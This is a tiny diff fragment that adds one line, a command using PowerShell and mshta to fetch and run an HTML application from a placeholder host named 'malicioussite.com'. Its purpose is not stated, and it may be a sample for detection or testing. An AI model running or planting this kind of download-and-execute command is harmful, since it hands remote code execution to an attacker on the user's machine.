@@ -1,0 +1,1 @@
+powershell.exe mshta http://malicioussite.com
